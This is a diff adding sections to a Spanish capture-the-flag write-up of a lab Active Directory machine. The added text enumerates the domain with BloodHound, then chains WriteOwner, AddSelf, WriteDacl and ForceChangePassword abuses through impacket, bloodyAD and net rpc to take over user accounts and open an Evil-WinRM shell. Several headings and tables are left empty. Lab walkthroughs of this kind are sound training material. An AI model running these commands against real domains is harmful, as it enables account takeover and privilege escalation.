@@ -549,13 +549,57 @@ LegacyAdmins
 ```
 Ya solo guardalos en un archivo o solo agrega que la salida se guarde en un archivo.
 
+<br>
 
+<h2 id="BloodHound">Enumeración de AD con BloodHound-Python</h2>
 
-ATAQUES POR PROBAR:
-SCF attack -> carga el file.scf y activa responder
-Fuerza bruta por kerberos o smb en base a roles de usuarios
-Usar bloodhound-python y analizar con bloodhound
-ENumerar denuevo RPC y ver cada descripcion de usuario, roles y grupos a los que pertenecen.
+Al no encontrar algo más, vamos a analizar la infraestructura del AD para identificar si nuestro usuario tiene algún privilegio/permiso, que nos permita ganar acceso a la máquina víctima.
+
+Para esto, utilizaremos la herramienta **bloodhound-python** para poder capturar toda esta información:
+```bash
+bloodhound-python -u 'mark' -p 'suP3rPa$sw0rd2026!&' -d PHANTOM.THL -dc DC01.PHANTOM.THL -ns 192.168.56.100 --zip -c all
+INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
+INFO: Found AD domain: phantom.thl
+INFO: Getting TGT for user
+INFO: Connecting to LDAP server: DC01.PHANTOM.THL
+INFO: Found 1 domains
+INFO: Found 1 domains in the forest
+INFO: Found 1 computers
+INFO: Connecting to LDAP server: DC01.PHANTOM.THL
+INFO: Found 18 users
+INFO: Found 60 groups
+INFO: Found 2 gpos
+INFO: Found 1 ous
+INFO: Found 19 containers
+INFO: Found 0 trusts
+INFO: Starting computer enumeration with 10 workers
+INFO: Querying computer: DC01.PHANTOM.THL
+INFO: Done in 00M 01S
+INFO: Compressing output into 20260427220657_bloodhound.zip
+```
+Carga ese **archivo ZIP** a **BloodHound** y busquemos la información del **usuario mark**.
+
+**Nota**: puede que la herramienta llegue a fallar si es que no tienes configurado un **DNS** de la máquina víctima, por lo que puedes hacer lo siguiente:
+```bash
+nano /etc/resolv.conf
+----
+nameserver IP_Máquina_AD 
+```
+Ahora sí, continuemos.
+
+Observa que tenemos la siguiente cadena de ataques al seleccionar la opción **Reachable High Value Targets**:
+
+<p align="center">
+<img src="/assets/images/THL-writeup-phantom/Captura1.png">
+</p>
+
+<p align="center">
+<img src="/assets/images/THL-writeup-phantom/Captura2.png">
+</p>
+
+Con lo que podemos ver, podemos realizar una cadena de ataques que nos llevara hasta el **usuario frank**, que es quien se puede conectar a la máquina víctima vía **WinRM**.
+
+Apliquemos los ataques.
 
 
 <br>
@@ -565,6 +609,162 @@ ENumerar denuevo RPC y ver cada descripcion de usuario, roles y grupos a los que
   <h1 id="Explotacion" style="text-align:center;">Explotación de Vulnerabilidades</h1>
 </div>
 <br>
+
+
+<h2 id="AttackChain">Aplicando Cadena de Ataques para Conectarnos a la Máquina Víctima</h2>
+
+La idea es aplicar la siguiente cadena de ataques:
+* Abusar del permiso `WriteOwner` que tenemos hacia el **usuario bob** para cambiar su contraseña.
+* Abusar del permiso `AddSelf` que tiene el **usuario bob** sobre el grupo **IT**, para agregarlo a este mismo grupo.
+* Abusar del permiso `WriteDacl` que tienen los usuarios del grupo **IT** para agregar al **usuario bob** al grupo **HELPDESK**.
+* Abusar del permiso `ForceChangePassword` que tienen los usuario del grupo **HELPDESK**, en este caso el **usuario bob**, para cambiarle la contraseña del **usuario frank**.
+* Utilizar al **usuario frank** para ganar acceso a la máquina víctima vía **WinRM** usando **Evil-WinRM**.
+
+Todo esto lo aplicaremos a continuación.
+
+<br>
+
+<h3 id="WriteOwner">Abusando del Permiso WriteOwner para Cambiar Contraseña de Usuario bob</h3>
+
+Primero entendamos, ¿que hace el permiso `WriteOwner`?
+
+| **Permiso WriteOwner** |
+|:----------------------:|
+| *El permiso WriteOwner en Active Directory (AD) es un derecho de control de acceso que permite a un principal de seguridad (usuario, grupo o equipo) modificar el propietario (owner) de un objeto dentro del directorio. Este objeto puede ser, entre otros, un usuario, grupo, equipo, unidad organizativa (OU), política de grupo (GPO) o plantilla de certificado.* |
+
+<br>
+
+Ahora entendamos que podemos hacer con este permiso:
+
+| **Abuso del Permiso WriteOwner** |
+|:--------------------------------:|
+| *Permite a los atacantes cambiar la propiedad de los objetos del directorio. Concretamente, al abusar del permiso WriteOwner en las listas de control de acceso discrecional (DACL), los adversarios pueden hacerse con el control de objetos sensibles y escalar privilegios dentro del dominio. En resume, el permiso WriteOwner te permite cambiar el propietario de ese objeto a cualquier usuario, permitiendo acciones como el cambio de contraseña de un usuario.* |
+
+<br>
+
+Aquí te dejo un blog que explica como aplicar abusar de este permiso, checa la sección **Exploitation Phase I**:
+* <a href="https://www.hackingarticles.in/abusing-ad-dacl-writeowner/" target="_blank">Hacking Articles - Abusing AD-DACL: WriteOwner</a>
+
+Utilizaremos la herramienta **impacket-owneredit** para hacer que el **usuario mark** sea nuevo propetario del **usuario bob**:
+```bash
+impacket-owneredit -action write -new-owner 'mark' -target-dn 'CN=bob,CN=Users,DC=PHANTOM,DC=THL' 'PHANTOM.THL'/'mark':'suP3rPa$sw0rd2026!&' -dc-ip 192.168.56.100
+Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Current owner information below
+[*] - SID: S-1-5-21-3580157585-956322742-780763674-512
+[*] - sAMAccountName: Admins. del dominio
+[*] - distinguishedName: CN=Admins. del dominio,CN=Users,DC=PHANTOM,DC=THL
+[*] OwnerSid modified successfully!
+```
+Funciono, modificamos la **DACL** del **objeto de usuario bob**.
+
+Ahora, usemos la herramienta **impacket-dacledit** para hacer que el **usuario mark** tenga el **Control Total (Full Control)** del **usuario bob**:
+```bash
+impacket-dacledit -action 'write' -rights 'FullControl' -principal 'mark' -target-dn 'CN=bob,CN=Users,DC=PHANTOM,DC=THL' 'PHANTOM.THL'/'mark':'suP3rPa$sw0rd2026!&' -dc-ip 192.168.56.100
+Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] DACL backed up to dacledit-20260427-222659.bak
+[*] DACL modified successfully!
+```
+Se modifico correctamente.
+
+Cambiemos la contraseña del **usuario bob** con la herramienta **net**:
+```bash
+net rpc password bob 'SuperP@ass123' -U PHANTOM.THL/mark%'suP3rPa$sw0rd2026!&' -S 192.168.56.100
+```
+
+Comprobemos si funciono el cambio con **netexec**:
+```bash
+nxc smb 192.168.56.100 -u 'bob' -p 'SuperP@ass123'
+SMB         192.168.56.100  445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:PHANTOM.THL) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         192.168.56.100  445    DC01             [+] PHANTOM.THL\bob:SuperP@ass123
+```
+Muy bien, funciono correctamente.
+
+<br>
+
+<h3 id="AddSelf">Abusando del Permiso AddSelf para Agregar al Usuario bob al Grupo IT</h3>
+
+Primero entendamos, ¿que hace el permiso `AddSelf`?
+
+| **** |
+|:-----:|
+| ** |
+
+<br>
+
+| **** |
+|:-------:|
+| *Al aprovechar el permiso «AddSelf», los atacantes pueden escalar privilegios añadiéndose a sí mismos a grupos con privilegios, como «Domain Admins» u «Backup Operators». Como resultado, obtienen control administrativo, se desplazan lateralmente por la red, acceden a sistemas confidenciales y mantienen su presencia en el sistema.* |
+
+<br>
+
+```bash
+bloodyAD --host "192.168.56.100" -d "PHANTOM.THL" -u "bob" -p "SuperP@ass123" add groupMember "IT" "bob"
+[+] bob added to IT
+```
+
+```bash
+net rpc group members "IT" -U PHANTOM.THL/bob%'SuperP@ass123' -S 192.168.56.100
+PHANTOM\bob
+```
+
+<br>
+
+<h3 id=""></h3>
+
+```bash
+impacket-dacledit -action 'write' -rights 'WriteMembers' -principal 'bob' -target-dn 'CN=HELPDESK,CN=Users,DC=PHANTOM,DC=THL' 'PHANTOM.THL'/'bob':'SuperP@ass123'
+Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] DACL backed up to dacledit-20260427-225913.bak
+[*] DACL modified successfully!
+```
+
+```bash
+bloodyAD --host "192.168.56.100" -d "PHANTOM.THL" -u "bob" -p "SuperP@ass123" add groupMember "HELPDESK" "bob"
+[+] bob added to HELPDESK
+```
+
+<br>
+
+<h3 id=""></h3>
+
+```bash
+net rpc password frank 'JakiadoJeje123' -U PHANTOM.THL/bob%'SuperP@ass123' -S 192.168.56.100
+```
+
+```bash
+nxc smb 192.168.56.100 -u 'frank' -p 'JakiadoJeje123'
+SMB         192.168.56.100  445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:PHANTOM.THL) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         192.168.56.100  445    DC01             [+] PHANTOM.THL\frank:JakiadoJeje123
+```
+
+```bash
+nxc winrm 192.168.56.100 -u 'frank' -p 'JakiadoJeje123'
+WINRM       192.168.56.100  5985   DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:PHANTOM.THL) 
+WINRM       192.168.56.100  5985   DC01             [+] PHANTOM.THL\frank:JakiadoJeje123 (Pwn3d!)
+```
+
+```bash
+evil-winrm -i 192.168.56.100 -u 'frank' -p 'JakiadoJeje123'
+
+Evil-WinRM shell v3.9
+
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
+
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\frank\Documents>
+*Evil-WinRM* PS C:\Users\frank\Documents> whoami
+phantom\frank
+```
+
+
+
+
+
 
 
 <h2 id=""></h2>
@@ -699,8 +899,12 @@ No entries found!
 </div>
 
 
-links
-
+* https://www.hackingarticles.in/abusing-ad-dacl-writeowner/
+* https://www.hackingarticles.in/addself-active-directory-abuse/
+* https://github.com/ShutdownRepo/targetedKerberoast
+* https://www.hackingarticles.in/abusing-ad-dacl-writedacl/
+* https://www.hackingarticles.in/forcechangepassword-active-directory-abuse/
+* https://github.com/61106960/adPEAS
 
 <br>
 
